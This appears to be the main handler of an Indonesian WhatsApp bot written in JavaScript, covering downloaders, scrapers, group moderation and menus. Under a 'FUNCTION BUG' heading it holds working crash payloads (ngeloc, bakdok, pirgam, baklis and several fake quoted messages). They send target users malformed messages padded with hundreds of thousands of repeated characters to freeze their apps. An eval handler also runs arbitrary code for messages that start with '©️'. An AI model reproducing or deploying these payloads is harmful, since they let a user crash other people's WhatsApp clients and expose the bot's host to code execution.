		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": gr,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': add}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": gr, "caption": `${pushname}`, 'jpegThumbnail': add}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": gr,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': add}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: gr,jpegThumbnail: add}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${global.ownername}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Ujang,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/c31ea54c441377970d979.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await conn.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}
//=================================================
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await conn.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

/*if (!m?.fromMe & !m?.isGroup) {
let user = global.db.data.users[m?.sender];
const cooldown = 21600000;
if (new Date() - user.pc < cooldown) return; 
let caption = `Hᴀʟᴏ @${m?.sender.split('@')[0]} ${ucapanWaktu}, ᴀᴅᴀ ᴀᴘᴀ ᴄʜᴀᴛ ᴏᴡɴᴇʀ *ɪᴛᴀᴄʜɪ - ᴍᴅ*, Jɪᴋᴀ ᴘᴇɴᴛɪɴɢ ᴛɪɴɢɢᴀʟᴋᴀɴ ᴄʜᴀᴛ ᴅᴀɴ *ɪᴛᴀᴄʜɪ - ᴍᴅ* ᴀᴋᴀɴ ᴍᴇᴍʙᴀʟᴀꜱ ꜱᴇᴄᴇᴘᴀᴛ ᴍᴜɴɢᴋɪɴ.`.trim();

conn.sendMessage(m?.chat, { 
text: caption, 
contextInfo: { 
forwardingScore: 10, 
isForwarded: true, 
mentionedJid: [m?.sender],
businessMessageForwardInfo: { 
businessOwnerJid: botNumber 
},
forwardedNewsletterMessageInfo: {
newsletterJid: 'bjir@newsletter',
serverMessageId: null,
newsletterName: "itachi"
}
}
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: "itachi Production Terverifikasi WhatsApp_"}}})
user.pc = new Date() * 1;
}
} catch (err) {
conn.sendMessage('6283852515748@s.whatsapp.net', { text: util.format(err) })
}
}*/
//=================================================
/**
 * Scraped By Kaviaann
 * Protected By MIT LICENSE
 * Whoever caught removing wm will be sued
 * @description Any Request? Contact me : vielynian@gmail.com
 * @author Kaviaann 2024
 * @copyright https://whatsapp.com/channel/0029Vac0YNgAjPXNKPXCvE2e
 */
async function snackVideo(url) {
  return new Promise(async (resolve, reject) => {
    try {
      if (!/snackvideo.com/gi.test(url)) return reject("Invalid URL!");
      const res = await fetch(url).then((v) => v.text());
      const $ = cheerio.load(res);
      const video = $("div.video-box").find("a-video-player");
      const author = $("div.author-info");
      const attr = $("div.action");
      const data = {
        title: $(author)
          .find("div.author-desc > span")
          .children("span")
          .eq(0)
          .text()
          .trim(),
        thumbnail: $(video)
          .parent()
          .siblings("div.background-mask")
          .children("img")
          .attr("src"),
        media: $(video).attr("src"),
        author: $("div.author-name").text().trim(),
        authorImage: $(attr).find("div.avatar > img").attr("src"),
        like: $(attr).find("div.common").eq(0).text().trim(),
        comment: $(attr).find("div.common").eq(1).text().trim(),
        share: $(attr).find("div.common").eq(2).text().trim(),
      };

      resolve(data);
    } catch (e) {
      reject(e);
    }
  });
}
  
   //  sengkrep snack by avosky.  //



async function snekVid(videoUrl) {
    try {
        const formData = new URLSearchParams({ id: videoUrl });
        const headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        };
        const { data } = await axios.post('https://getsnackvideo.com/results', formData, { headers });
        const result = ParseData(data);
        return result;
    } catch (error) {
        return KaloError(error);
    }
}
// wm avs
function ParseData(html) {
    const $ = cheerio.load(html);
    const result = {
        status: 200,
        thumbnail: $('.img_thumb img').attr('src'),
        noWatermarkVideo: $('a.download_link.without_watermark').attr('href'),
    };
    if (!result.noWatermarkVideo) {
        return { status: 404, message: 'Video Gada' };
    }
    return result;
}
// wm avs
function KaloError(error) {
    console.error('Error Request:', error.message || error);
    return {
        status: error.response ? error.response.status : 500,
        message: error.message || 'Tetiba Error',
    };
}
// wm avs
snekVid('https://s.snackvideo.com/p/Ijr7ysPz')

//================batas≠=========================//
 /*if (db.data.users[m.sender].autolevelup) {
let user = global.db.data.users[m.sender]
if (!user.autolevelup) return !0
let before = user.level * 1
while (levelling.canLevelUp(user.level, user.exp, global.multiplier)) user.level++
if (user.level <= 1) {
user.role = 'Petualangan Awal 🌄'
} else if (user.level <= 11) {
user.role = 'Pertarungan Melawan Kegelapan 🗡️'
} else if (user.level <= 21) {
user.role = 'Kemunculan Ancaman Baru ☠️'
} else if (user.level <= 31) {
user.role = 'Kehancuran Dunia yang Terancam 🌍'
} else if (user.level <= 41) {
user.role = 'Revolusi Pahlawan ⚔️'
} else if (user.level <= 51) {
user.role = 'Era Kedamaian yang Rapuh 🕊️'
} else if (user.level <= 61) {
user.role = 'Masa Depan yang Tidak Pasti 🌌'
} else if (user.level <= 71) {
user.role = 'Kembalinya Ancaman Kuno 🔮'
} else if (user.level <= 81) {
user.role = 'Misi Keselamatan Galaksi 🚀'
} else if (user.level <= 91) {
user.role = 'Perang Besar: Awal dari Semua 🌟'
} else if (user.level <= 100) {
user.role = 'Perang Besar: Akhir dari Semua 💥'
}
let role = user.role
if (before !== user.level) {
let naiklevell = `乂  L E V E L  U P

┌  ≡ Progress : *${before} -> ${user.level}*
└  ≡ Role : *${db.data.users[m.sender].role}* 


*Hadiah Level Up:*
+1 Pangkat Yang Terbuka`.trim()
try {
	let image, data, pp
				try { pp = await conn.profilePictureUrl(m.sender, 'image') }
				catch { pp = 'https://telegra.ph/file/60b60aad1312a63d640a6.jpg' }
				image = await new can.Up().setAvatar(pp).toAttachment()
				data = await image.toBuffer()
				await conn.sendMessage(m.chat, { image: data, caption: text }, { quoted : fkontak })
} catch {
reply(naiklevell)
}
}
}       
  */
               //FUNCTION BUG//
 //═════════════════════════════════════════//
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
   
async function aipong(target) {
await conn.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: conn.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #💀🥶CyyxeroInvinityCrash☠️🥶"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: zycakep });
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./database/base/image/Dich.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const zyvoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}
  
const zybut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'pois0n - zxv',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const zyrphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const zycakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` ZxV - Bug ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};
//══════════════════════════════════════════//
                 //batas
async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}
 
async function xero () {
var xero = [
"𝘼𝙇",
"𝘼𝙇𝙒",
"𝘼𝙇𝙒𝘼",
"𝘼𝙇𝙒𝘼𝙔",
"𝘼𝙇𝙒𝘼𝙔𝙎",
"𝘼𝙇𝙒𝘼𝙔𝙎𝙓",
"𝘼𝙇𝙒𝘼𝙔𝙎𝙓𝙀",
"𝘼𝙇𝙒𝘼𝙔𝙎𝙓𝙀𝙍",
"𝘼𝙇𝙒𝘼𝙔𝙎𝙓𝙀𝙍𝙊",
"𝐀𝐋𝐖𝐀𝐘𝐒𝐗𝐄𝐑𝐎 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑!!"
]
let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Awalan

for (let i = 0; i < loading.length; i++) {
/*await delay(10)*/
await conn.sendMessage(from, {text: loading[i], edit: key });//setelah nya
}
}
     
async function loading () {
var loading = [
"_`• Sedang Loading, Harap Tunggu !!`_",
"_`• ᴘʀᴏᴄᴇꜱꜱ !!`_\nᴛᴜɴɢɢᴜ ꜱᴇʙᴇɴᴛᴀʀ ʏᴀ ꜱᴀʏᴀɴɢ 🥺"
]
let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Awalan

for (let i = 0; i < loading.length; i++) {
/*await delay(10)*/
await conn.sendMessage(from, {text: loading[i], edit: key });//setelah nya
}
}

     
if (autodelete) {
conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: mek.key.id,
participant: mek.key.participant
}
})
}


//=================================================
/*let reactionMessage = {
                    react: {
                        text: `👁️‍🗨️`,
                        key: { remoteJid: m.chat, fromMe: true, id: mek.key.id }
                    }
                }
                await sleep(1500)
                conn.sendMessage(m.chat, reactionMessage)*/
//=================================================//

     
if (!conn.public) {
if (!m.key.fromMe) return
}
/*if (setting.autobio){
if (setting.autobio === false) return
let settingstatus = 0;
if (new Date() * 1 - settingstatus > 1000) {
await conn.setStatus(`I'm Ryo Yamada 🤖 | ${runtime(process.uptime())} ⏰ | Status : ${conn.mode ? "Public Mode" : "Self Mode"} | 1.3k Users`)
settingstatus = new dt() * 1
}
     }*/
let rn = ['online']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
conn.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
if (isCmd && !isUser) {
pengguna.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pengguna, null, 2))
}
// Anti Link
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\nOwner telah mengirim link, owner bebas memposting link apa pun`})
await conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
conn.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:kr})
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: conn.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
conn.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
 
     
/*const data_autochat = JSON.parse(fs.readFileSync('./database/autochat.json', 'utf8'));
const isAutochat = data_autochat.includes(m.sender.split("@")[0])
function saveDataChat() {
  fs.readFileSync('./database/autochat.json', JSON.stringify(data_autochat, null, 2), 'utf8')*/
    
    
const totalfitur = () =>{
            var mytext = fs.readFileSync("./main.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }

async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await conn.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

conn.autoshalat = conn.autoshalat ? conn.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.id : m.sender
	let id = m.chat 
    if(id2 in conn.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    sunset: '05:54',
    midnight: '00:00',
    dzuhur: '12:02',
    fajar: '05:10',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Jakarta dan sekitarnya._`
    conn.autoshalat[id] = [
    reply(caption),
    setTimeout(async () => {
    delete conn.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }
     
const sendapk = (teks) => {
conn.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
m.reply('*Rusak Om !! Yang Bener Contoh : Yoapk Namabebas*')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii}.apk`)
sendapk(buffer)
}
}
//=================================================//
const sendzip = (teks) => {
conn.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
m.reply('*Rusak Om !! Yang Bener Contoh : Yozip NamaBebas*')
}
for (let ikali of zipnye) {
if (budy === ikali) {
let buffer = fs.readFileSync(`./database/zip/${ikali}.zip`)
sendzip(buffer)
}
}
//=================================================//
const senddocu = (teks) => {
conn.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
m.reply('*Rusak Om !! Yang Bener Contoh : Yopdf NamaBebas*')
}
for (let ikal of docunye) {
if (budy === ikal) {
let buffer = fs.readFileSync(`./database/Docu/${ikal}.pdf`)
senddocu(buffer)
}
}
const sendvn = (teks) => {
conn.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, {quoted:m})
}
for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}
//Menuuuu info
const infoo = `
 ┈──────────────────────⏣
           ⏤͟͟͞͞ᵡ    *｢ I N F O   B O T ｣*   ᵡ͟͟͞͞⏤
┈──────────────────────⏣
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
❐ *𝙱𝚘𝚝 𝙽𝚊𝚖𝚎* : ${global.botname}
❐ *𝙲𝚛𝚎𝚊𝚝𝚘𝚛* : ${ownername}
❐ *𝙰𝚔𝚝𝚒𝚏* : ✅
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
> STATUS
❐ _*𝙿𝚛𝚎𝚖𝚒𝚞𝚖*_ : *${isPrem ? '✅' : '❎'}*
❐ _*Akses*_ : *FREE*
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
> DATE
❐ _*𝚃𝚊𝚗𝚐𝚐𝚊𝚕*_ : *${hariini}*
❐ _*𝙹𝚊𝚖*_ : *${time} WIB*
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬`

/*const infoo1 = `═════════════════════
*${m2}</> ᴅ ᴀ ꜱ ʜ ʙ ᴏ ᴀ ʀ ᴅ </>${m2}*
═════════════════════
🌟 ʜᴀɪ @${m.sender.split('@')[0]}, ᴀᴋᴜ ᴀᴅᴀʟᴀʜ ${global.botname}, ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ʏᴀɴɢ ᴀᴋᴀɴ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ ᴅᴀʟᴀᴍ ʙᴀɴʏᴀᴋ ʜᴀʟ ᴅɪ ᴡʜᴀᴛꜱᴀᴘᴘ. ᴊɪᴋᴀ ᴀɴᴅᴀ ᴍᴇɴᴇᴍᴜᴋᴀɴ ʙᴜɢ ᴀᴛᴀᴜ ᴇʀʀᴏʀ, ᴍᴏʜᴏɴ ʟᴀᴘᴏʀᴋᴀɴ ᴋᴇᴘᴀᴅᴀ ᴏᴡɴᴇʀ.
═════════════════════

═════════════════════
*${m2}</> ɪ ɴ ꜰ ᴏ - ʙ ᴏ ᴛ </>${m2}*
═════════════════════
*➤  ɴᴀᴍᴀ ʙᴏᴛ*: ${botname}
*➤  ᴏᴡɴᴇʀ: ᴅɪᴄʜxᴘʟᴏɪᴛ*
*➤  ᴠᴇʀꜱɪ*: 1.0.0
*➤  ᴍᴏᴅᴇ*: ${conn.public ? 'public' : 'self'}
*➤  ᴛᴏᴛᴀʟ ᴜꜱᴇʀ*: ${Object.keys(global.db.data.users).length}
*➤  ᴛᴏᴛᴀʟ ᴍᴇɴᴜ*:${totalfitur()}
*➤  ʀᴜɴᴛɪᴍᴇ*: ${runtime(process.uptime())} 
═════════════════════
═════════════════════
*${m2}</> ɪ ɴ ꜰ ᴏ - ᴜ ꜱ ᴇ ʀ </>${m2}*
═════════════════════
*➤ ɴᴀᴍᴇ*: ${pushname}
*➤ ᴛᴀɢꜱ*: @${m.sender.split('@')[0]}
*➤ ʟɪᴍɪᴛ*:
*➤ ᴇxᴘ*: 0
*➤ ᴘʀᴇᴍɪᴜᴍ*: ${isPrem ? '✅' : '❎'}
*➤ ᴍᴏɴᴇʏ*: ${getMonay(m.sender)}
═════════════════════`*/

//================================================//

var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
}
//=================================================//
if (('family100'+from in _family100) && isCmd) {
kuis = true
